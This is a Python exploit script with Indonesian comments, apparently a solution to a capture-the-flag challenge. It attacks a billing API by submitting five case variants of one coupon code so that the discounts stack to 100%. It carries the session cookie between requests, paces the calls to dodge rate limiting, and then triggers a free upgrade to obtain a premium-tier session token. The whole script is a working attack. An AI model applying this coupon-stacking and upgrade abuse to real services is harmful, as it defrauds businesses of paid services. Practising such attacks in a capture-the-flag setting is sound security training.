import requests
import time

url_apply = "https://9zkv6e70cc16.boroctf.com/api/billing/apply"
url_status = "https://9zkv6e70cc16.boroctf.com/api/billing/status"
url_upgrade = "https://9zkv6e70cc16.boroctf.com/api/billing/upgrade"

init_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiS2FybCIsInJvbGUiOiJ1c2VyIiwidGllciI6ImZyZWUiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc4MTUzMzM2Nn0.t-S69_8uL5-3_1n7r0py_v4l1d4t10n_f4k3"

# Menggunakan dictionary manual untuk melacak session state secara konsisten
current_cookies = {
    "session_jwt": init_jwt
}

# 5 Variasi kombinasi casing unik untuk mengumpulkan diskon 100%
casing_variants = [
    "KLAUD20OFF",
    "klaud20off",
    "Klaud20off",
    "kLaud20off",
    "klAud20off"
]

print("=== Menguras Harga Klaud Max Billing ===")

for i, code in enumerate(casing_variants, start=1):
    print(f"[*] Mengirimkan variasi #{i}: {code}")
    r = requests.post(url_apply, json={"code": code}, cookies=current_cookies)
    print(f"    Status: {r.status_code} | Res: {r.text}")
    
    # Ambil update cookie terbaru dari server
    if r.cookies:
        for cookie in r.cookies:
            current_cookies[cookie.name] = cookie.value
            
    time.sleep(2.2)  # Menghindari limitasi HTTP 429

print("\n=== Memeriksa Hasil Akhir State Session ===")
r_status = requests.get(url_status, cookies=current_cookies)
print(f"Status Aplikasi: {r_status.text}")

if '"final_price":0' in r_status.text.replace(" ", ""):
    print("\n[+] Harga mencapai $0.00! Mengeksekusi Upgrade Gratis...")
    r_up = requests.post(url_upgrade, cookies=current_cookies)
    print(f"Upgrade Response ({r_up.status_code}):\n{r_up.text}")
    
    # Jika server memberikan token JWT baru yang sudah berstatus MAX tier setelah upgrade
    if "session_jwt" in r_up.cookies:
        print(f"\n[+] Sukses! Gunakan Token JWT Max baru Anda:\n{r_up.cookies['session_jwt']}")
else:
    print("\n[-] Harga belum mencapai $0.00. Periksa kembali variasi kombinasi casing Anda.")
